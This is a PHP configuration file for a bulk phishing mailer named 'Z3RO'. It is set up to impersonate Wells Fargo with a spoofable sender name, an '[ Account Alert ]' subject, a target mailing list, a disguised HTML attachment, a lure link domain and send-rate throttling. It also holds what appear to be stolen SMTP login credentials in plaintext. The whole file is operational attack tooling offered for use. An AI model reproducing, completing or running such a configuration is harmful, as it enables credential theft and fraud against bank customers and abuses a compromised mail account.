<?php
$Z3ROSETUP = [

"From Name"              => " Wells Fargo Online® ",
"Masking From Mail"      => 1, // 0 =Spoofing  |  1 =No spoofing

"From Mail"              => "naclark7@schat.net",   
"Mail Subject"           => "[ Account Alert ] Contact Fargo™",
"Letter"                 => "w3lls.html",
"Mail List / Leeds"      => "Leeds.txt",
  
/*Z3RO>>  Attachment Settings  */
"Send Attachment"        => 0, // 0 = No, 1= YES
"File Attachment"        => "att.html", //path to attachment.
"Name Attachment"        => "ATT00928.htm", //Name attachment
  
/* Link Shortcut  */
"Link"                   => ["namerchcacacse.com"],// link shortcut

/* Z3RO token */
"Key"                    => "Z3RO",
  
/* Mail Other Settings  */
"Mail Priority"          => 1, // 1 = High, 2 = Medium, 3 = Low
"Time"                   => "America/Adak",
"Sleeptime"              => 2, // Delay Duration per Email
"Mail Limit"             => 100, // How Many Email for Delay Limit
"Delay Limit"            => 5, // Delay Limit for Mail Limit

];
/* Z3RO SMTP SETTINGS  */
$Z3ROSMTP = [
 
      [
"SMTP Server" => "mail.schat.net",
"Username"    => "naclark7@schat.net", 
"Password"    => "nanger12!",
"Port"        => "587",
"Tls"         => "tls",
     ],
	 

];


